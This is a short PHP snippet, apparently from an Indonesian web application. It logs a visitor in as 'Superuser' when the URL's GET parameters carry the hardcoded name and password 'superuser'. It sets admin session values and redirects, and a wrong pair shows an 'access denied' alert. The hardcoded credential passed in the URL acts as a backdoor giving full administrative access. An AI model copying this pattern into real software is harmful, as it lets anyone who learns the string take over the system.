<?php
if(isset($_GET['x']))
{ //1
	
	$nama = $_GET['x'];
	$pass = $_GET['y'];	
			if(($nama == 'superuser') && ($pass == 'superuser') )
			{
				$_SESSION['namauser_NLG']='Superuser';
				$_SESSION['level_NLG']='Superuser';
				$_SESSION['id_NLG'] = 'Superuser';	
				$_SESSION["expires_by"] = 'Superuser';	
				login_validate();				
				echo '<script>location="?page=home"</script>';
				
			}
				
			else 
			{ echo '<script language="javascript">alert("Akses Di tolak !")</script>';
			echo '<script>location="?page=login"</script>'; }
		
		
		
	

}//1
?>